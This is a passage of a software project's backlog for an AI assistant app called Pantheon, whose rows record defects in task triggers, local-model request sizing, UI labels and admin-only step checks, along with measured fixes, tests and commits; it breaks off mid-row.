- [x] **B1074** **The README shows the product: screenshots and GIFs, made by one command.** The owner: *"take screenshots of key pages… use these in the readme… possibly gif animated images to show some workflows"*. `scripts/showcase/capture.py` boots this checkout on a throwaway data dir (inheriting nothing that points at real data), seeds a fictional world through the API, plays its chats on a scripted loopback model while Pantheon runs every tool for real, and writes 23 PNGs (10 screens × dark/light at 1440×900, 3 at phone width) and 5 GIFs into `docs/media/` — 3.72 MB, against a 15 MB budget the test enforces; nothing leaves the machine (Chromium behind a dead proxy, 0 requests blocked). With `--workstation` it photographs the agent's own Ubuntu desktop. The README opens on it and reads pictures first. `Verify:` `tests/test_the_showcase_pipeline.py` — **16 cases** (README pictures exist, fit, have alt text and are all generated; the demo world holds nothing shaped like a secret or a real address, and the scan catches nine planted ones; the server's environment; the seed against the real API, read back through it). 3 fail with the old README; **mutation 15 of 15 caught**. — agent:`showcase` — **done 2026-10-01 (`0b1388d`, `0fd675a`, `deadf44`).** Re-run it before each release: a picture of a screen that has since changed is a claim the product no longer makes (`Law 10`).`

- [ ] **B1075** **An event fired from the email MCP server reaches its task with no payload.** INFERRED from code (`SLICE-B-DESIGN` § 0.6, re-read 2026-10-01): `mcp_servers/email_server.py` fires `document_updated` (a draft merged into a document, `:1750`) and `document_created` (a new draft, `:1792`) in the email MCP SUBPROCESS (`src/builtin_mcp.py` spawns it), where no scheduler is set; `src/event_bus.py:_handle_event`'s no-scheduler branch writes `next_run = now` and the main process's loop then runs the task as a plain due task — the envelope `build_trigger` made is never handed to it. So `B602`/`P8-23`'s promise ("which document") does not hold for the one producer of `document_updated` in the product, nor for email drafts' `document_created`. `P22-05` added only a guard there (a running workflow is not queued again). Fix: carry the trigger across the process boundary (e.g. persist the envelope on the task or a pending-trigger row the loop reads). `Verify:` a task on `document_updated` fired by a merged email draft is handed the document's id and title. — found by `SLICE-B-DESIGN`, confirmed by `wf-engine`

- [ ] **B1076** **`task_type` is stored unchecked by `POST /api/tasks` and `manage_tasks edit`.** INFERRED from code: `create_task` stores `req.task_type` as given and `src/tools/system.py`'s edit writes `args["task_type"]` (only the tool schema's enum stops the model). An unknown value runs as a Prompt task (`_execute_task_locked`'s `else`), with no prompt. `wf-api` refuses `workflow` at those doors for `P22-05`; any other unknown word still lands. `Verify:` a create or edit with `task_type: "banana"` is refused in words. — found by `SLICE-B-DESIGN`, `wf-engine` — **also filed by `wf-api` (one row, not two):** measured 2026-10-01, `POST /api/tasks` stores any `task_type` it is sent (`TaskCreate.task_type: str`; `"foo"` is stored), and `manage_tasks edit` writes `args["task_type"]` with only its schema's enum in front of it. One allowlist is the fix, with care: `src/tools/cookbook.py` makes `download` and `serve` tasks through its own path, so the route's list is the person-facing types (`llm`, `research`, `action`), not every stored value (`FORBIDDEN.md` Part 1 pins the stored ones). `Verify:` `POST /api/tasks {"task_type": "foo", …}` → 400 naming the types; an existing cookbook task still loads and runs. — design § 8, filed by `wf-api`

- [ ] **B1077** **An event-triggered task that fires its own event can run again after it finishes.** INFERRED from code (`SLICE-B-DESIGN` § 0.7): `_handle_event` commits `next_run = now` before `run_task_now` answers `False` for a task already running; an event handled after the run's final `next_run = None` leaves it due, and the loop runs it again. `P22-05` closed this for workflows (a run's own events never wake its task, `run_origin`); a plain task — a Prompt task on `document_updated` whose tools edit a document — still has it. Fix: the same `run_origin` mark around `_execute_task_locked`'s executors for every task (the walker already shows the shape). `Verify:` a Prompt task on `document_updated` that edits a document runs once. — `wf-engine`

- [ ] **B1078** **The Output picker promises a notification is "also saved to the session for history"; nothing saves it.** INFERRED from code: `routes/task/task_routes.py:_output_targets` describes `notification` that way; `_deliver_task_result` returns for any target that is not `session`/`email`/`mcp__`, and the run's notification carries the body only. (`P22-05`'s per-step `notification` delivery inherits the same behaviour.) `Verify:` after a task with output *Notification* runs, its result is in its chat — or the picker stops saying so. — `wf-engine`

- [ ] **B1079** **A Run task step's target, stopped because its workflow was stopped by the foreground gate, says "Stopped by user".** The workflow's own row says "Paused because Pantheon became active … It will run again"; the target's run (inside it) records the cancel with `_stopped_as` finding nothing and so falls back to `STOPPED_BY_USER` — the `B1047` mislabel, one level down — and the re-queued workflow runs the target again from the start. `Verify:` a gate stop during a Run task step leaves the target's row saying why. — `wf-engine`

- [x] **B1080** **A Prompt step a person runs — *Run now*, *Test this step* — never reaches a model on this machine while their Pantheon page is open.** MEASURED 2026-10-02 on a scratch merge of wf-engine + wf-api + wf-ui, the showcase's scripted model on loopback (`/tmp/scratch-wf-ui/e2e_probe2.py`, `e2e_probe4.py`): with a client asking Pantheon something every second, a switched-on one-step Prompt workflow's *Run now* sat at "Step 1: Say hi…" and the model received **no** request; `POST /api/workflows/{id}/nodes/n1/test` answered **504 after 45 s**, the model again never asked. With nothing asking Pantheon for 40 s, the same run succeeded and the model got one request. A plain Prompt task on wf-ui's own tree (base engine) did the same: 60 s at "Starting…", model asked nothing (`e2e_probe3.py`). INFERRED cause (read, not instrumented): `src/llm_core.py`'s local-model gate holds every `workload="background"` call to an `is_local_endpoint` while `has_foreground_activity()`, and a task's model call is background whoever asked — `B1047` taught the scheduler's two waits who asked, not this third; the step test's interactive slot (design § 0.3) skips the scheduler's wait but not this one. A browser page polls (heartbeat, notifications), so on a self-hosted install with a local model a person who presses *Test this step* or *Run now* on a Prompt step waits until they stop using Pantheon. It blocks `P22-08`'s `Verify:` for any model on the machine. `Verify:` with a page open and a model on loopback, *Run now* on a Prompt workflow and *Test this step* both answer within the model's own time. — found by `wf-ui` driving `P22-05`/`P22-08` end to end — **done 2026-10-02 (`wf-walker`, `84b7584`; `SLICE-CD-DESIGN` § 0.11).** The inferred cause held: `_run_agent_loop` passed `workload="background"` for every run, so a step a person ran, tested or allowed was held at `llm_core`'s local-model gate while their page was open. `workload` now follows who started the run — `"foreground"` for a run a person started, `"background"` otherwise — and a plain Prompt task's *Run now* has the same fix (the same defect, one place). `CI:` `tests/test_a_step_that_needs_a_yes_waits_for_it.py::test_a_step_a_person_runs_reaches_a_local_model_while_their_page_is_open`; the mutation "workload hardcoded" is caught (`P22-17`'s 21 of 21). **Driven on the merged tree (`integrate-d`, `5c27a51`):** *Test this step* on a Prompt step with its pinned sample, the scripted model on loopback and the page open → "✓ Test: Success · 143 ms · scripted-demo" in 0.4 s, the model asked once — `P22-08` closed on it.

- [ ] **B1081** **Activity's step chip on a workflow run counts log lines, and the Workbench calls a workflow's parts steps.** MEASURED on the scratch merge: a two-step workflow's run row reads "Morning inbox brief · 3 steps" — the run's step log holds a line per step and a "Continued to …" between them, and `step_count` is the log's length. A person who built two steps reads three (`Law 10`). Fix on the wire (a `node_count`, or `step_count` counting `kind: "node"` lines for a workflow run) or in the chip. `Verify:` a two-step workflow's run reads "2 steps". — found by `wf-ui`

- [ ] **B1082** ***Test this step* offers inputs a step cannot be handed.** MEASURED on the scratch merge: on the first step of a schedule-started workflow the source list offers *What it was handed in the last run*, *Something I type here* and *An example the model writes*, and each is refused in words ("The step is handed nothing, so a sample would never be used: “Summarise my inbox” is the first step and the workflow does not start on an event or a webhook."); on a step not yet run, *last* is refused the same way. The server knows the step's input shape (`node_input_shape`) and the panel does not; serving it on the document (or a `sources` list per step) would let the panel offer only what can be used. `Verify:` the first step of a scheduled workflow offers only *Nothing*, and says why. — found by `wf-ui`

- [ ] **B1083** **A step opened on the canvas can sit under its own side panel.** MEASURED at 1400×860 on a run (Runs tab: the list, the canvas and the panel share the width): clicking *Send me the summary* opened its panel over the very box clicked. A failed run's step is fitted beside its panel since wf-ui `ec1f7ef`; a step a person opens is not, on any canvas (the tasks canvas too, where the stage is wider and it shows less). `Verify:` opening any step leaves its box visible beside the panel. — found by `wf-ui`

- [ ] **B1084** **On four dark palettes some model names are drawn under 4.5:1.** `chatRenderer.js:modelColor()`'s dark arm is `hsl(hue, 55%, 65%)` for every hue, and at that lightness a blue-violet is much darker than a cyan. Measured on the seeded demo over 410 names, the worst (`model-320`, `rgb(125, 117, 215)`) against the bubble: **`claude` 3.40:1**, `retrowave` 4.09, `forest` 4.18, `midnight` 4.45; the other eight dark palettes 4.59–5.09. `B1072` fixed the light arm and left the dark one to the character on purpose (its row was the light palettes). The light arm's per-hue luminance search (`modelColorForHue`) is the shape of the fix: a luminance floor for the dark arm, lifting only the hues under it. `Verify:` on every dark palette the role line's contrast against its bubble is ≥ 4.5:1 for any model name; `tests/test_the_model_name_is_legible_on_light_palettes.py`'s browser half already measures all sixteen. — found by `w8-ui` while closing `B1072` — evidence `/tmp/scratch-w8-ui/measure_b1072.py`

- [ ] **B1085** **The browser tests' server runs on a database that has its tables on one connection only.** `tests/conftest.py` sets `DATABASE_URL=sqlite:///:memory:` for the in-process suite, and `tests/test_the_command_palette_in_a_browser.py:app_url` — the fixture every Chromium test boots the app with — hands the server `dict(os.environ, …)`, so `app.py` runs on an in-memory SQLite: one database per connection. Measured in the fixture's `app.log` during `w8-ui`'s runs: `GET /api/default-chat`, `/api/notes`, `/api/sessions`, `/api/model-endpoints` answer 500 `no such table: …` from the first page load, and `GET /api/assistant/session` answered 200 twice and then 500 `no such table: crew_members`. The browser tests pass because few assert on DB-backed routes; any that does is flaky. `tests/test_the_assistant_has_a_sidebar_door.py` works round it with a module fixture that points `DATABASE_URL` at a file before `app_url` starts. `Verify:` `app_url` gives the server a database file in its temp data dir; a browser test's `app.log` holds no `no such table`. — found by `w8-ui` while closing `B1044`

- [ ] **B1086** **At phone width, Shift+Enter in the composer drops the caret instead of breaking the line.** Measured at 390×844 on the seeded demo (welcome screen and a chat): type *hello*, press Shift+Enter — the value stays *hello* (no newline) and `document.activeElement` becomes `<body>`; at 1400×860 the same keys insert a newline and keep focus. Phones rarely send Shift+Enter, but a tablet under 768 px with a keyboard does. Cause not traced (`app.js`'s composer keydown handles only unshifted Enter at that width). `Verify:` at 390×844 Shift+Enter inserts a newline and the composer keeps focus. — found by `w8-ui` while writing `B1073`'s test — evidence `/tmp/scratch-w8-ui/dbg_b1073.py`

- [x] **B1087** **With a typed *Local reply ceiling* at or above what a local vLLM can serve, Chat mode is refused and the person sees nothing.** Measured through the real app against the scripted model served the way vLLM serves a 32,768 window (`demo_model.DemoModel(max_model_len=32_768)`): with `local_inference_max_tokens` typed as 32,768, Chat mode with Brainstorm sent `max_tokens: 32,768`, the server refused it (`32768 > 32768 - 492`), and the turn showed no reply. `D-2026-10-01-04` made a typed ceiling apply on every door (`B934`'s `local_door_max_tokens`), so a person who types their server's window as its "reply ceiling" has every chat request refused. `B1029` added the resend (`llm_core.servable_max_tokens`, asked when a caller passes `max_tokens_floor`) and wired the agent path only, as that row asked. Fix: pass `max_tokens_floor` = the preset's own number from the chat doors (`_chat_candidate_request_factory`, chat streaming, `/api/chat`'s `llm_call_async_with_route_fallback`). `Verify:` with 32,768 typed, a Chat-mode Brainstorm turn against a 32,768-window vLLM answers. — found while working `B1029` — evidence `/tmp/scratch-w8-agent/measure_b1029_typed.py` — **done 2026-10-02 (agent `w9-llm`, `702382d`).** **Measured first** on `0e64d2b`: as the row says (prompt 496), and `/api/chat` answered **HTTP 400** with the server's words. **Fix**: chat-mode streaming and `/api/chat` pass the preset's own number as `max_tokens_floor` — the opt-in to `llm_core`'s one resend rule (`Law 7`). **One of the row's three sites is redundant and was not used**: with fallbacks on, `stream_llm_with_fallback` and `llm_call_async_with_route_fallback` merge the door's kwargs into the request `_chat_candidate_request_factory` builds for every candidate, and the number is the same for every candidate, so setting it in the factory too would be a second copy a mutation could delete unnoticed (it did, before it was taken out). With the owner's call (`D-2026-10-02-01` §2, `B1088`) the chat doors also cover a window with less room than the preset: Chat mode with Brainstorm on a 4,500 window was refused at 4096 and is sent what fits. A sibling the row does not name is filed as its own row: a local MiniMax with the ceiling typed and **no** preset still is not sent again (the profile fills the length after the caller's number is read). `Verify:` with 32,768 typed, a Chat-mode Brainstorm turn against a 32,768-window vLLM answers. `CI:` `tests/test_the_chat_doors_are_asked_for_what_the_server_can_serve.py` — **7 cases** through the real app (`capture.Server`; `/api/chat_stream` and `/api/chat`; a real socket to the scripted model with a window; an endpoint per turn): the row's `Verify:` (refused at 32,768, sent again at exactly window − prompt, answered and saved); `/api/chat` the same; with fallbacks on (`PUT /api/prefs/…`), both doors through the factory, the selected server answering and no fallback used (2); less room than the preset on the chat door, nothing typed; a server that takes the number asked once; a request the window holds sent once. **5 of 7 fail on `d4d8ea1`** (the two guards pass). **Mutation: 3 of 3 caught**: `/api/chat` passing no floor 2; chat streaming passing no floor 3; the wrapper dropping the door's floor for a factory-built candidate 1. — agent:`w9-llm`

- [x] **B1088** **When a vLLM's window has less room left than the preset's own length, every door's request is refused — and sending less than the preset is a call neither ruling makes.** Measured (scripted model, window 9,000, an Agent-mode Brainstorm turn whose prompt the server counted at ~7,800): the lifted request is refused, and `B1029` does not resend, because what the server can serve (~1,200) is below the preset's 4096 — the floor `D-2026-09-08-02` sets. Chat mode with the same preset sends 4096 and is refused the same way once the conversation is long enough. It is reachable in ordinary use: the agent's per-round trim reserves at most 2,048 tokens for the reply (`_trim_route_request_messages`, `reserve_tokens = min(max(max_tokens, 512), 2048)`), so a long run on a 32k window keeps the prompt near `window − 2048`, which leaves less than Code Analyze's 8000 or Reason's 6000. **Needs the owner**: may a request ask for less than its preset when the server says that is all it can serve? (If yes: `servable_max_tokens`' floor becomes 1. If no: the trim should reserve the preset's length on a server that enforces its window.) `Verify:` per the call. — found while working `B1029` — **done 2026-10-02 (agent `w9-llm`, `d4d8ea1`) — the owner's call, `D-2026-10-02-01` §2: ask for what fits.** **Measured first** on `0e64d2b` through the real app against the scripted model served as vLLM serves a window: Agent mode with Brainstorm on a 9,000 window was refused at 1,000,000 (prompt 7,830 by the server's count) and not sent again — 1,170 is below 4096 — and the turn ended on the server's 400 with no reply; Chat mode with Brainstorm on a 4,500 window was refused at 4096 (prompt 496) the same way. **Fix**: `llm_core.servable_max_tokens(status, raw, sent)` returns what the server says it can serve when it is at least one token and below what was sent — the preset is no longer a floor for the server's own words, an unlifted request is talked down too, and it still never asks for more than was sent, so a typed ceiling bounds it. Whether a request may be sent again stays its caller's to say: `max_tokens_floor` on `stream_llm` / `llm_call_async` is now only the opt-in, so every caller that passes nothing (titles, memory, background jobs) is refused exactly as before. The trim's reserve is left as it is (the call). The Chat-mode half needed the chat doors wired and is held there (`B1087`). `src/agent_loop.py`: one comment in `_candidate_request`. `Verify:` an Agent-mode Brainstorm turn against a vLLM whose window leaves less than 4096 answers, sent exactly window − prompt. `CI:` `tests/test_a_local_vllm_is_asked_for_what_it_can_serve.py` — **19 cases** (was 15): the less-room case flips (refused at 1,000,000, sent again at window − prompt below 4096, answered); the rule's seven cases on the new signature (vLLM's two wordings; less room than any preset; an unlifted request talked down; never more than was sent; a refusal that states no window; a prompt over the window); each door, called with only its socket faked, sent below the preset when the caller passes it (2) and sent once when it does not (2). **10 of 19 fail on `0e64d2b`** (the pass-nothing guards and the turns that never needed a floor pass; 7 of the 10 are the rule's new signature). **Mutation: 6 of 6 caught**: the preset a floor again 4; asks for more than was sent 1; the stream path resending every caller 1; the stream path resending none 8; `llm_call_async` resending every caller 1; `llm_call_async` resending none 2. — agent:`w9-llm`

- [x] **B1089** **Against a server that holds a request to its window, every lifted Agent round is refused once before it is answered.** `B1029`'s resend is per request: one extra request per round, and vLLM logs each refusal with a traceback (`serving_chat.py`, `logger.exception("Error in preprocessing prompt inputs")`, read at v0.10.1). Read, not measured on a real vLLM. Possible fix within the same rulings: remember, per endpoint and model, the window a server stated, and ask later rounds for at most `window − estimate(prompt)`, keeping the resend as the backstop. Low priority — correctness is `B1029`'s and holds. `Verify:` a ten-round Agent turn against a window-enforcing server makes eleven requests, not twenty. — found while working `B1029` — **done 2026-10-02 (agent `w9-llm`, `694409b`), within `D-2026-10-02-01` §2 — no new ruling.** **Measured first** on `0e64d2b` through the real app (the scripted model served as vLLM serves a 32,768 window): a ten-round Agent turn (nine tool rounds and the answer) made **20** streamed requests, **10** refused. **Fix**: a length refusal states the window and how many tokens the server counted in the prompt; `llm_core` keeps both, per endpoint and model — the window, and the server's tokens per character of that request's messages and tools as JSON — and a later request whose caller opts in (`max_tokens_floor`, the resend's own opt-in) asks for at most `window − ⌈rate × its own characters⌉` (`fitted_max_tokens`, in `stream_llm` and `llm_call_async`, before the receipt and the cache key, so both record the number sent). **Four rules, each a call the owner can overrule cheaply (`Law 10`)**: it is an **estimate**, so it never takes a request below the caller's own number (the preset's) — below that only the server's own words do (§2), so a window with less room than the preset still costs one refusal per request, answered exactly; it never asks above what the caller asked (a typed ceiling bounds it); a low estimate is refused, sent again, and the rate learned again from that refusal; and what a server said **lapses after `STATED_WINDOW_TTL_SECONDS`, ten minutes**, because a local server can restart with another window (`model_context` re-queries local windows for that reason) — a smaller one refuses and is re-learned at once, a larger one is learned when it lapses, and until then a reply may be held below the new window (never below the preset). A server that takes the number never refused it and is never in the table, so llama.cpp, Ollama and LM Studio see no change. **Measured after**: the same turn makes **11** streamed requests, **1** refused, each later round asking one token under what the server could serve. `Verify:` a ten-round Agent turn against a window-enforcing server makes eleven requests, not twenty. `CI:` `tests/test_a_server_that_stated_its_window_is_asked_for_what_fits.py` — **11 cases**: through the real app, the row's `Verify:` (11 requests, the first refused, every later one above the preset and below the window, shrinking as the prompt grows); a later chat fitted from its first request, and its receipt (`P4-25`) says that number; both chat doors learn the window and fit the next turn (2); a 9,000 window — the estimate is not trusted below Brainstorm's 4096 and the server answers it exactly; a server that takes the number is sent the lift every time; through `stream_llm` with only its socket faked (a server counting a chat template's markup per message, which no fixed rate predicts): a low estimate refused, resent exactly and re-learned; a lapse; only a caller that opts in; never above what was asked; kept per model. `tests/test_a_local_vllm_is_asked_for_what_it_can_serve.py` (`B1029`'s): every turn now meets a server of its own (a remembered window would answer the turns that must meet one for the first time), and its salvage case now asserts the salvage is sent what fits — it was refused and resent; `llm_call_async`'s own resend is held by `/api/chat` and the door cases. **On `702382d` 4 of the 6 real-app cases fail** (the two guards pass); the 5 socket-faked cases error there because the table they isolate is new — with that isolation made optional, the low-estimate case fails, the lapse case fails on the new setting's name, and the three that hold what the table must not do pass. **Mutation: 13 of 13 caught**: never fitted 6; fitted without opting in 1; the estimate below the preset 1; above what was asked 1; never lapsing 1; the lookup keyed without the model 5; a lookup that takes any model's entry on the server 1; the rate never learned again 1; the window alone, no prompt estimate 6; stream refusals not kept 4; `llm_call_async` refusals not kept 1; `llm_call_async` never fitted 2; the receipt written before the fit 1. — agent:`w9-llm`

- [x] **B1090** **The force-answer salvage sends a fixed `temperature: 0.3`, past a `pantheon-qwen3` candidate's 0.2 cap and over a temperature the person chose — read, not measured.** `src/agent_loop.py`, the `_force_answer` block: `llm_call_async(..., temperature=0.3, ...)` — every round asks `pan_qwen_route_temperature(_requested_temperature, candidate_model, explicit_params)` (`B935`); the salvage asks nothing. Fix, if it holds: `temperature=pan_qwen_route_temperature(0.3, model, explicit_params)` — or the person's own when they chose one, as that rule says. `Verify:` a forced answer on a `pantheon-qwen3` candidate is sent ≤ 0.2. — found while working `B1050` — **done 2026-10-02 (agent `w9-llm`, `cbec185`). It holds, both halves.** **Measured first** on `0e64d2b` through the real app against the scripted model listed under a `pantheon-qwen3` name — a notes-shaped Agent turn (the one kind the finetune is handed tools for in Agent mode; anything else takes its short-answer or document path and never reaches a tool round), its calls written as fenced blocks on an endpoint that declares no tools, going round in circles until the loop breaker forced an answer with no prose: **no preset, the rounds were sent 0.2 and the salvage 0.3; Brainstorm's 0.9 chosen, the rounds 0.9 and the salvage 0.3.** **Fix**: the salvage's 0.3 is its own default, so it goes through the rounds' rule — `pan_qwen_route_temperature(the person's number if they chose one else 0.3, model, explicit_params)`: a qwen candidate is held at 0.2, a chosen number is the person's (`D-2026-08-26-06`: a default never overrides a choice), anything else keeps 0.3. **One consequence stated**: on any model, a chosen temperature now reaches the salvage too (Brainstorm's 0.9 where it was 0.3). Asked of the candidate the call goes to (the pin rebinds `model`, `B1050`). `scripts/showcase/demo_model.py`, test-facing only: `DemoModel(model_id=)` lists and answers under another name (the showcase keeps `MODEL_ID`), and its request log keeps each request's temperature. `Verify:` a forced answer on a `pantheon-qwen3` candidate is sent ≤ 0.2. `CI:` `tests/test_the_salvage_is_sent_the_rounds_temperature.py` — **4 cases** through the real app (`capture.Server`, `/api/chat_stream`, a real socket to the scripted model): the row's `Verify:` (a qwen candidate's salvage sent 0.2, as its rounds); Brainstorm's chosen 0.9 on a qwen candidate and on another model (2); where nobody chose, another model's salvage keeps 0.3. **3 of 4 fail on `694409b`** with the new scripted model (the guard passes). **Mutation: 4 of 4 caught**: the fixed 0.3 again 3; no qwen cap 1; a choice not honoured 2; the rounds' number where nobody chose 1. — agent:`w9-llm`

- [x] **B1091** **The force-answer salvage is sent the whole untrimmed transcript — read, not measured.** The rounds send `request_messages` (pictures shaped per candidate by `tool_result_images.for_model`, then trimmed to the candidate's window by `_trim_route_request_messages`); the salvage sends `list(messages)` plus its instruction. After a long run its prompt can exceed the window the rounds were trimmed to (a vLLM refuses a prompt over its window outright, which no length can fix), and a model that cannot see is sent the pictures. Fix, if it holds: build the salvage's messages through the same two steps for the answering candidate. `Verify:` a forced answer after a run whose transcript exceeds the window is sent a request inside it. — found while working `B1050` — **done 2026-10-02 (agent `w9-llm`, `3c2adc1`). It holds.** **Measured first** on `0e64d2b` through the real app against the scripted model served as vLLM serves a 20,000 window: after a chat whose earlier reply ran to 58,036 characters, an Agent turn going round in circles had every round trimmed to the window (at most 17,737 characters, the long reply left out), and its salvage was sent **13 messages, 80,975 characters — refused outright** ("your request has 20244 input tokens"), so the turn ended on the canned apology. The pictures half was read and is held below (no tool in the test world returns a picture). **Fix**: the salvage's messages go through the two steps every round's do for the candidate it is sent to (`_candidate_request`) — `tool_result_images.for_model`, then `_trim_route_request_messages` — with the instruction last, so the trim keeps it. **Measured after**: the same salvage is sent 11 messages, 18,066 characters, and answered. `src/agent_loop.py`: the salvage block only. `Verify:` a forced answer after a run whose transcript exceeds the window is sent a request inside it. `CI:` `tests/test_the_salvage_is_shaped_and_trimmed_like_the_rounds.py` — **4 cases**: through the real app (`capture.Server`, the scripted model with a 20,000 window), the row's `Verify:` (after the long chat the salvage is sent inside the window — the person's words and its instruction kept, the long reply left out — and answered, not the apology); with nothing to trim, the salvage is exactly the forced round's request with the instruction after it; through the real chat route, loop and fallback wrapper in-process (`B1050`'s harness, a tool picture in the conversation; only the model's socket and the endpoint's own answer to "can this model see" faked): a model that cannot see is not sent the picture in its salvage, as in its rounds after the first; a model that can see is sent it. **2 of 4 fail on `cbec185`** (the two guards pass). **Mutation: 4 of 4 caught**: the salvage untrimmed again 1; the pictures not shaped 1; the pictures always put into words 1; the instruction dropped from the request 2. — agent:`w9-llm`

- [ ] **B1092** **A chain's card says "Part of a 4-step workflow", and since `P22-05` a workflow is something else.** MEASURED on the merged tree (`docs/media/tasks-dark.png`, re-captured): *Collect weekly metrics* — a task in a chain — wears the chip "Part of a 4-step workflow" (`static/js/tasks.js`, `P8-34`'s chip, `B1046`'s door), and ⋮ → *Workflow* on it opens the chain, while the Workbench's shelf lists *Morning inbox brief* as a workflow — a named document with one start, its own switch, versions and runs — and calls chains "Tasks and chains". A person reading the card looks for "the workflow" on the shelf and does not find it; *Make this chain a workflow* reads as a no-op on something already called one. One word per thing (`Law 15`, `Law 10`): a chain is a chain. `Verify:` a chained task's chip reads "Part of a 4-step chain" (and ⋮ says *Chain*), and "workflow" on a card appears only on a workflow's start. — found by `integrate-c` while checking the re-captured `tasks-*`

- [ ] **B1093** ***Test this step* that the person was told did not run, runs later — and every test leaves an empty chat.** MEASURED on the merged tree (drive runs 1 and 2, the server log): *Test this step* on a Prompt step with the pinned sample, page open, local model → "Not tested: Request exceeded 45s timeout." (app.py's request ceiling, 504) with the model asked 0 times (`B1080`); the test kept running on the server, and its model round **completed 91 s after the press, 46 s after the 504**, once the page closed (`[agent-timing] round_stream_done round=1 elapsed=91.151s`). And the press made a chat row "[Task] Morning inbox brief · Send me the summary" in the Tasks folder — created at the press, read with no messages at 01:47 in run 1, before any real run of the workflow — though a test "delivers nothing". (Whether a later real run's delivery reuses that row was not measured.) The first is `Law 10` (said one thing, did another); the second leaves a trace of a test in the sidebar. `Verify:` a test the person was told did not happen does not run afterwards (cancelled with the request, or the panel waits for it and says what it made); after a test, no new chat exists. — found by `integrate-c`

- [ ] **B1094** **A scheduled run that comes due while the person is using Pantheon is moved fifteen minutes on, with nothing said.** MEASURED (drive run 1): a switched-on workflow due at 01:42, a client asking `GET /api/tasks/{id}/runs` every 3 s (not a passive path) — **no run and no run row in four minutes**; with nothing asking, the same schedule fired 5 s after it was due (run 2: due 02:00, run row 02:00:05). INFERRED from code for the 15 minutes: `src/task_scheduler.py:_check_due_tasks` — `if foreground_active: task.next_run = now + timedelta(minutes=15); continue` — no row, no word, and again at the next tick if the person is still active. `B1060`'s call ("a background run waits for idle before it takes the model slot … its row says it waited") covers a run that was dispatched; a due scheduled task the tick finds while Pantheon is in use is never dispatched, so "every morning at 08:00" (`P22-05`'s own example) becomes 08:15, 08:30 … for a person at their desk, and Activity shows nothing until it runs. `Verify:` a scheduled task due while a page is active gets a *Queued — waiting for Pantheon to be idle…* row at its time and runs when Pantheon goes idle, its `next_run` not moved. — found by `integrate-c` (it cost the drive two runs)

- [ ] **B1095** **The tasks canvas says "Not run yet" on a step that ran while it was open.** MEASURED (drive run 1, `P22-02`): with the Workbench open on *Tasks and chains*, *Collect weekly metrics* ran (`error`) and *if it fails* ran *Tell me the metrics run failed* (`error`); both boxes still read "○ Not run yet" (clicking *Tasks and chains* again did not reload them) until the window was opened again. The base canvas (`5654cd4`) has no refresh either — not a merge defect. `Law 10`. `Verify:` a run that finishes while the canvas is open changes its step's mark within a few seconds (the Tasks window's own refresh, or the notifications poll, as the trigger). — found by `integrate-c`

- [ ] **B1096** ***What it was handed*, between two steps of a workflow, shows ids a person cannot use and calls the step a task.** MEASURED (drive run 5, `P22-07`): the failed step's panel reads "Continued from Summarise my inbox — task=Summarise my inbox, task_id=e7d344c8-…, run_id=dda70f7a-…, status=success, result=Five things in your inbox this morning: …" and its JSON `{"source": "task", "event": …, "data": {"task", "task_id", "run_id", "status", "result"}}` — the chain hand-off's words (`trigger_summary`, `TASK_HANDOFF_FIELDS`, `P8-23`), where the "task" is a step and the ids are internal. The failed sentence also carries the action's raw "STDERR:" label ("failed: STDERR: The shared drive … is not mounted."). `Verify:` a step's *What it was handed* summary reads like "From “Summarise my inbox” (it worked): Five things in your inbox…" with no ids, the data still under it; a failed action's sentence has no "STDERR:". — found by `integrate-c`

- [x] **B1097** **`admin_only_action_of` does not see a For-each's inner action, nor an HTTP or MCP step, so a non-admin's workflow holding one takes the error path rather than the admin-refusal path.** `src/task_action_policy.py:70-111` reads only top-level `action` steps (`:105`) and `run_task` targets. Measured 2026-10-02 on `wf-rules` (`61370d7`): a document whose For-each repeats `ssh_command`, or that has an `http`/`mcp` step (admin-only kinds, `SLICE-CD-DESIGN` § 0.6), answers `None` there. Nothing runs — `validate_document` refuses it at run with `admin_only` — but the run is recorded `error` with the document's sentence instead of the task being paused with a `skipped` run, which is what every other admin-only step gets (`record_admin_refusal`). Fix: read the inner step and the two kinds there (one rule, `Law 7`: ask `workflow_document.ADMIN_ONLY_KINDS`). `Verify:` a non-admin's workflow with a For-each of `ssh_command` is paused with the admin sentence, as a plain `ssh_command` step is. — found during P22-12 — agent:`wf-rules` — **done 2026-10-02 at the merge (`integrate-d`, `57394db`, `179caf3`).** Confirmed on the merged tree, then closed: `document_steps` / `admin_only_action_in` walk a For-each's repeated step, an HTTP step answers `api_call` and an MCP step its tool, and the save door's `first_admin_only_action` asks the same walk — so a non-admin's workflow holding one is paused with the admin sentence before any step runs, as a plain admin-only step is. `Verify:` `tests/test_the_halves_are_one_product.py` — `test_a_non_admins_workflow_with_an_admin_step_is_paused_before_any_step_runs` (3) and `test_the_save_door_asks_the_step_a_for_each_repeats`.

- [ ] **B1098** **A third copy of the MCP disabled-tool read.** `routes/mcp/mcp_routes._load_disabled_map` (`:105`)
  repeats the query `mcp_manager.load_disabled_map()` now holds (and `agent_loop._load_mcp_disabled_map` names). Two
  copies of "which tools has an operator switched off" go stale apart (`Law 7`); the route can import the public
  one. `Verify:` one definition in the tree. — found while working `P22-14` — agent:`wf-effects`

- [ ] **B1099** **An HTTP step's query and body values never offer the picker.** Whether another step may fill
  `query[i].value` / `body[i].value` depends on that entry's name (`workflow_slots.classify_argument`), which the
  palette cannot answer once per kind, so it says them `never` with the classifier's sentence and the browser offers
  no picker there; a person can still type a reference into a text-like name (`text`, `message`, `subject`) and the
  save accepts it. Fail-closed and safe, but `P22-09`'s "pick a field" does not reach HTTP bodies. Options: a
  classify route, or the panel asking the save route's refusal per entry. `Verify:` a body entry named `text`
  offers the picker; one named `to` shows the reason. — found while working `P22-13` — agent:`wf-effects` — **also found by `wf-canvas`** (one row, not two; `integrate-d` ruled the second a duplicate): against the C-W fake, whose palette gave `http` per-field slots (`query[].value`, `body[].value`), the picker was offered whatever the key and only Done or Save said a key was a destination. On the merged tree the palette says each entry `never`, so the picker is never offered on a destination key — the one gap `test_every_field_a_panel_offers_a_picker_on_is_one_the_renderer_fills` measures (`http body[0].value`). `wf-canvas`'s `Verify:`: typing the key `url` takes *Insert a field…* away from its value and says why, before Done.

- [ ] **B1100** **A `pantheon-qwen3` finetune is told about tools outside an AI step's list.** On that model a turn
  that reads as notes or a document gets `_minimal_pantheon_notes_messages` / the doc prompt, which name
  `manage_notes`, `manage_calendar`, `manage_tasks` (and the document tools) in fixed text. Every call outside the
  step's list is still refused with its reason (`P22-16`, tested), but the model is offered what it may not use.
  The finetune modes could stand down when a step names its tools. `Verify:` an AI step limited to `web_search` on
